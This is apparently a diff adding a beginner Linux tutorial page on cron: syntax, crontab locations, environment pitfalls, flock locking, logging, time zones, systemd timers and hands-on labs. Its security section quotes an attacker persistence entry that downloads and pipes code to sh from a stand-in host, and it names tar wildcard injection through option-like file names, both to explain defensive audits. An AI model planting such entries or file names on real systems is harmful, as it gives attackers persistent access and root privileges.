@@ -1,0 +1,316 @@
+---
+title: "Cron and Scheduled Jobs"
+summary: "Run backups, cleanups, reports and renewals automatically on a schedule. Learn cron syntax, user and system crontabs, why cron jobs fail silently, how to log and lock them, and when to use systemd timers or cloud schedulers instead."
+level: beginner
+minutes: 16
+prerequisites: ["systemd and Services", "Environment Variables and the PATH"]
+tags: ["Linux", "Automation"]
+---
+
+<Callout type="tip" title="In one minute">
+**cron** runs commands on a schedule written as five fields: **minute hour day-of-month month day-of-week** — `30 2 * * *` means "every day at 02:30". Edit your jobs with `crontab -e`, list them with `crontab -l`. Cron runs with a **minimal environment** (short `PATH`, no `.bashrc`), so use absolute paths, redirect output to a log, prevent overlapping runs with `flock`, and check the server's **time zone**. systemd timers and cloud schedulers (EventBridge, Kubernetes CronJobs) do the same job with better logging.
+</Callout>
+
+## What is it?
+
+**cron** is a daemon (`cron` on Debian/Ubuntu, `crond` on RHEL) that wakes up every minute, checks the schedules, and runs whatever is due. A schedule file is a **crontab** ("cron table").
+
+### Cron syntax
+
+```text
+┌───────── minute        (0–59)
+│ ┌─────── hour          (0–23)
+│ │ ┌───── day of month  (1–31)
+│ │ │ ┌─── month         (1–12 or jan–dec)
+│ │ │ │ ┌─ day of week   (0–7, 0 and 7 = Sunday, or sun–sat)
+│ │ │ │ │
+* * * * *  command to run
+```
+
+| Symbol | Meaning | Example |
+| --- | --- | --- |
+| `*` | Every value | `* * * * *` every minute |
+| `,` | List | `0 9,17 * * *` at 09:00 and 17:00 |
+| `-` | Range | `0 9-17 * * 1-5` every hour 9–17, Monday–Friday |
+| `/` | Step | `*/15 * * * *` every 15 minutes |
+| `@reboot` | Once at startup | `@reboot /usr/local/bin/warmup.sh` |
+| `@daily`, `@hourly`, `@weekly`, `@monthly` | Shortcuts | `@daily` = `0 0 * * *` |
+
+Common schedules:
+
+| Schedule | Meaning |
+| --- | --- |
+| `*/5 * * * *` | Every 5 minutes |
+| `0 * * * *` | Every hour, on the hour |
+| `30 2 * * *` | Every day at 02:30 |
+| `0 3 * * 0` | Every Sunday at 03:00 |
+| `0 0 1 * *` | First day of every month at midnight |
+| `0 9 * * 1-5` | Weekdays at 09:00 |
+
+Gotcha: if **both** day-of-month and day-of-week are set (not `*`), cron runs when **either** matches. `0 0 13 * 5` runs on every 13th **and** every Friday — not only Friday the 13th.
+
+### Where crontabs live
+
+| Location | Edited with | Runs as | Has a user field? |
+| --- | --- | --- | --- |
+| User crontab | `crontab -e` (stored in `/var/spool/cron/`) | That user | No |
+| `/etc/crontab` | Editor (root) | The user named in the line | **Yes** |
+| `/etc/cron.d/*` | Files (packages, config management) | The user named in the line | **Yes** |
+| `/etc/cron.hourly/`, `daily/`, `weekly/`, `monthly/` | Drop executable scripts in | root | No (whole scripts) |
+
+```text
+# /etc/cron.d/backup — note the extra "user" field
+30 2 * * *  backup  /usr/local/bin/backup-db.sh >> /var/log/backup.log 2>&1
+```
+
+## Why does it matter?
+
+- **Full-stack:** cleaning expired sessions and temp uploads, sending daily report emails, syncing data from an API, regenerating sitemaps.
+- **DevOps:** backups, log cleanup, certificate renewal (Certbot installs a timer/cron job), Docker image pruning, health checks.
+- **Cloud:** the same idea appears as EventBridge Scheduler (AWS), Cloud Scheduler (GCP), Kubernetes **CronJob** and GitHub Actions `schedule:` — all using cron syntax.
+- **Security:** backups and patching are security controls that depend on schedules actually running. And cron is one of the most common **persistence** mechanisms attackers use on Linux.
+
+## When and where do you use it?
+
+- Nightly database backup to S3.
+- Deleting files older than 7 days from an uploads temp folder.
+- Renewing TLS certificates.
+- Running a report at 08:00 every Monday.
+- Warming a cache after reboot (`@reboot`).
+- Checking a website every 5 minutes and alerting if it is down.
+
+## How does it work?
+
+### Managing your crontab
+
+```bash
+crontab -l            # list
+crontab -e            # edit (opens $EDITOR)
+crontab -r            # REMOVE ALL your jobs — no confirmation! (r is next to e on the keyboard)
+sudo crontab -u app -l   # another user's crontab
+```
+
+### The cron environment — why jobs "work in the terminal but not in cron"
+
+Cron does **not** load your `.bashrc`/`.profile`. It runs with something like:
+
+```text
+SHELL=/bin/sh
+PATH=/usr/bin:/bin
+HOME=/home/you
+```
+
+So:
+
+- `node`, `pm2`, `aws`, `docker-compose` installed in `/usr/local/bin`, `~/.nvm` or `~/.local/bin` are **not found**.
+- `%` has a special meaning in crontab lines (newline) and must be escaped as `\%` — a classic bug with `date +%F`.
+- The working directory is `$HOME`, not your project.
+- `/bin/sh` is often `dash`, not bash — bash-only syntax fails.
+
+Fixes:
+
+```text
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+MAILTO=""
+
+# Use absolute paths, cd explicitly, escape %, and log everything
+30 2 * * *  cd /srv/app && /usr/bin/node scripts/cleanup.js >> /var/log/app/cleanup.log 2>&1
+0 3 * * *   /usr/local/bin/backup-db.sh > /var/log/backup-$(date +\%F).log 2>&1
+```
+
+Best practice: put the logic in a **script** with a proper shebang and `set -euo pipefail`, and keep the crontab line trivial.
+
+### Output and logging
+
+By default cron **emails** the output to the user — on most servers no mail is configured, so it is simply lost. Always redirect: `>> /path/file.log 2>&1`, or send to the journal with `| logger -t jobname`. Cron itself logs each run to syslog / the journal:
+
+```bash
+grep CRON /var/log/syslog | tail          # Debian/Ubuntu
+journalctl -u cron --since today          # (crond on RHEL)
+```
+
+### Preventing overlapping runs
+
+If a job runs every 5 minutes but sometimes takes 7, two copies run at once — double emails, corrupt files, doubled database load. Use a lock:
+
+```text
+*/5 * * * *  /usr/bin/flock -n /tmp/sync.lock /usr/local/bin/sync.sh >> /var/log/sync.log 2>&1
+```
+
+`flock -n` exits immediately if the previous run still holds the lock.
+
+### Time zones
+
+Cron uses the **system time zone**. Many cloud servers are UTC, so `0 9 * * *` runs at 14:00 in Pakistan (UTC+5). Check with `timedatectl`. Prefer servers in UTC and convert in your head (or use `CRON_TZ=` where supported). Kubernetes CronJobs and EventBridge let you set a time zone explicitly.
+
+### Cron vs systemd timers vs cloud schedulers
+
+| | cron | systemd timer | Kubernetes CronJob / EventBridge |
+| --- | --- | --- | --- |
+| Setup | One line | Two unit files | YAML / cloud config |
+| Logs | DIY redirection | Automatic, in the journal | Pod logs / CloudWatch |
+| Missed runs (server off) | Skipped (anacron helps) | `Persistent=true` catches up | Managed |
+| Overlap control | DIY (`flock`) | Service won't start twice | `concurrencyPolicy: Forbid` |
+| Resource limits, sandboxing | No | Yes | Yes |
+| Runs on | One server | One server | Cluster / cloud (no single server to fail) |
+
+Use cron for simple tasks, systemd timers for anything important on a server, and cloud/Kubernetes schedulers when there is no long-lived server.
+
+## Hands-on
+
+```bash
+# 1. A job that runs every minute and logs the time
+mkdir -p ~/cronlab
+cat > ~/cronlab/tick.sh <<'EOF'
+#!/usr/bin/env bash
+set -euo pipefail
+echo "$(date -Is) tick from $(whoami), PATH=$PATH"
+EOF
+chmod +x ~/cronlab/tick.sh
+
+( crontab -l 2>/dev/null; echo "* * * * * $HOME/cronlab/tick.sh >> $HOME/cronlab/tick.log 2>&1" ) | crontab -
+crontab -l
+
+# 2. Wait a minute or two, then:
+cat ~/cronlab/tick.log            # note the short PATH cron gives you
+grep CRON /var/log/syslog | tail -n 3 2>/dev/null || journalctl -u cron -n 5 --no-pager
+
+# 3. See the failure mode: a command that is not in cron's PATH
+( crontab -l; echo '* * * * * nvm --version >> $HOME/cronlab/fail.log 2>&1' ) | crontab -
+sleep 70; cat ~/cronlab/fail.log  # "nvm: not found"
+
+# 4. Clean up — remove only the lab lines
+crontab -l | grep -v cronlab | grep -v "nvm --version" | crontab -
+crontab -l; rm -rf ~/cronlab
+
+# 5. Audit: every scheduled job on this machine
+for u in $(cut -d: -f1 /etc/passwd); do sudo crontab -u "$u" -l 2>/dev/null | sed "s/^/[$u] /"; done
+ls -la /etc/cron.d /etc/cron.daily
+systemctl list-timers --all --no-pager
+```
+
+Check cron expressions while learning:
+
+```javascript
+// When will "*/15 9-17 * * 1-5" run? A tiny matcher for the five fields.
+function field(spec, min, max) {
+  const out = new Set();
+  for (const part of spec.split(",")) {
+    const [range, stepStr] = part.split("/");
+    const step = Number(stepStr ?? 1);
+    let [a, b] = range === "*" ? [min, max] : range.split("-").map(Number);
+    if (b === undefined) b = stepStr ? max : a;
+    for (let v = a; v <= b; v += step) out.add(v);
+  }
+  return out;
+}
+function nextRuns(expr, count = 6, from = new Date("2026-11-10T08:58:00")) {
+  const [m, h, dom, mon, dow] = expr.split(" ");
+  const M = field(m, 0, 59), H = field(h, 0, 23), D = field(dom, 1, 31), MO = field(mon, 1, 12), W = field(dow, 0, 6);
+  const runs = [];
+  const t = new Date(from);
+  while (runs.length < count) {
+    t.setMinutes(t.getMinutes() + 1);
+    if (M.has(t.getMinutes()) && H.has(t.getHours()) && D.has(t.getDate()) && MO.has(t.getMonth() + 1) && W.has(t.getDay()))
+      runs.push(t.toString().slice(0, 21));
+  }
+  return runs;
+}
+console.log("*/15 9-17 * * 1-5 →", nextRuns("*/15 9-17 * * 1-5"));
+console.log("30 2 * * *        →", nextRuns("30 2 * * *", 3));
+```
+
+(This simplified matcher ignores the day-of-month/day-of-week "either" rule and names like `mon`; use a site such as crontab.guru or a library like `cron-parser` for real work.)
+
+## Real-world example
+
+A VPS runs a Node.js API with PostgreSQL. The team's scheduled jobs, all in `/etc/cron.d/app` and each backed by a script with logging and locking:
+
+```text
+SHELL=/bin/bash
+PATH=/usr/local/bin:/usr/bin:/bin
+MAILTO=""
+
+# Every 10 min: expire old sessions (never two at once)
+*/10 * * * *  app     flock -n /run/lock/sessions.lock /srv/app/bin/expire-sessions.sh 2>&1 | logger -t expire-sessions
+
+# 02:30 daily: database backup to S3, then delete local copies older than 3 days
+30 2 * * *    backup  /usr/local/bin/backup-db.sh 2>&1 | logger -t backup-db
+
+# 04:00 Sundays: prune unused Docker images
+0 4 * * 0     root    /usr/bin/docker image prune -af --filter "until=168h" 2>&1 | logger -t docker-prune
+```
+
+The important part is what happens when a job **fails**: the backup script ends by pinging a "dead man's switch" monitoring URL (Healthchecks.io, Cronitor, or a CloudWatch metric). If the ping does not arrive by 03:30, someone is alerted. Silent backup failures are discovered only when you need the backup — that monitoring is what turns a schedule into a reliable control.
+
+## Common mistakes
+
+- **Relying on your shell's PATH** — use absolute paths or set `PATH` at the top of the crontab.
+- **No output redirection**, so errors vanish.
+- **Unescaped `%`** in crontab lines.
+- **Overlapping runs** without `flock`.
+- **Wrong time zone** assumptions on UTC servers.
+- **`crontab -r`** instead of `-e` — deletes everything without asking. Keep crontabs in Git / config management.
+- **Running everything as root** "because it was easier".
+- **No monitoring** — a job that silently stopped months ago.
+
+## Security lens
+
+<Callout type="security">
+Scheduled jobs run unattended, often as root, forever. That makes them perfect for attackers — and important for defenders to audit.
+</Callout>
+
+- **Persistence:** adding a line to a crontab (`* * * * * curl http://evil/x | sh`) is one of the most common ways attackers survive reboots and cleanups — the cryptominer from "Processes and Signals" typically comes back this way. Audit all user crontabs, `/etc/crontab`, `/etc/cron.*`, and systemd timers; alert on changes.
+- **Writable scripts run by root:** if a root cron job runs `/opt/scripts/cleanup.sh` and a normal user can edit that file (or its directory), that user can become root. Check owners and modes of everything root's jobs execute.
+- **Wildcard injection:** a root job like `cd /uploads && tar czf /backup/u.tgz *` can be abused by creating files named like options (`--checkpoint-action=exec=...`). Use `--` and explicit paths.
+- **PATH hijacking:** a job without absolute paths whose `PATH` includes a writable directory can be tricked into running a fake binary.
+- **Restrict who can use cron** with `/etc/cron.allow` and `/etc/cron.deny` on shared servers.
+- **Secrets in crontab lines** are visible to anyone who can read the crontab and in process listings while the job runs. Load them inside the script from a protected file or secrets manager.
+- **Backups and patching are scheduled jobs** — monitor that they succeed; missed security updates and failed backups are real risks.
+
+## Interview questions
+
+<QA q="What does the cron expression 0 */6 * * 1-5 mean?">
+At minute 0 of every sixth hour (00:00, 06:00, 12:00, 18:00), on Monday through Friday, every month. The fields are minute, hour, day of month, month and day of week.
+</QA>
+
+<QA q="A script works when you run it manually but fails from cron. What do you check?">
+Cron runs with a minimal environment: a short PATH, no shell profile, /bin/sh instead of bash, a different working directory and no TTY. Check that the script uses absolute paths or sets PATH, has a correct shebang and is executable, does not rely on variables from .bashrc, escapes % in the crontab line, and redirect output to a log to see the actual error. Also confirm the job ran at all in the cron logs, and check the user and time zone.
+</QA>
+
+<QA q="How do you prevent a cron job from running twice at the same time?">
+Wrap it with a lock, most simply `flock -n /path/to/lockfile command`, which exits if the previous run still holds the lock. Alternatively use a systemd timer (a service will not be started again while running) or a Kubernetes CronJob with concurrencyPolicy: Forbid.
+</QA>
+
+<QA q="How do attackers use cron, and how would you detect it?">
+They add entries to user or system crontabs, or drop scripts into /etc/cron.d or the cron.daily-style directories, to re-run malware periodically and survive reboots. Detect it by inventorying all crontabs and timers, monitoring those files and directories for changes, alerting on cron jobs that download and execute content or run from /tmp, and reviewing cron execution logs.
+</QA>
+
+<QA q="When would you choose a systemd timer or a Kubernetes CronJob over cron?">
+Use a systemd timer when you want automatic logging in the journal, dependency ordering, resource limits, sandboxing, catch-up after downtime and protection against overlapping runs on a single server. Use a Kubernetes CronJob or a cloud scheduler when workloads run in a cluster or serverless environment, so the job does not depend on a single machine and gets retries, history and concurrency policies.
+</QA>
+
+## Key terms
+
+<Terms>
+  <Term name="cron">Daemon that runs commands on a schedule.</Term>
+  <Term name="crontab">A file of scheduled jobs, or the command that edits it.</Term>
+  <Term name="Cron expression">Five fields — minute, hour, day of month, month, day of week.</Term>
+  <Term name="@reboot">Special schedule that runs once at startup.</Term>
+  <Term name="flock">Utility that uses a lock file to prevent concurrent runs.</Term>
+  <Term name="anacron">Runs missed daily/weekly jobs on machines that are not always on.</Term>
+  <Term name="systemd timer">systemd's scheduler, an alternative to cron.</Term>
+  <Term name="Dead man's switch">Monitoring that alerts when an expected job check-in does not arrive.</Term>
+  <Term name="Persistence">Attacker techniques for keeping access across reboots and cleanup.</Term>
+</Terms>
+
+## Practice
+
+1. Write cron expressions for: every 10 minutes; weekdays at 18:30; the 1st and 15th of each month at 06:00.
+2. Do the Hands-on lab and explain why the `nvm` job fails.
+3. Create a job that writes `df -h /` to a log every hour, with locking and logging.
+4. List every scheduled job (crontabs and timers) on your machine. Do you know what each one does?
+5. Your server is in UTC. Write the cron line for a report that must run at 09:00 Pakistan time.
+
+Next: **Hardening a Linux Server** — putting the whole module together.
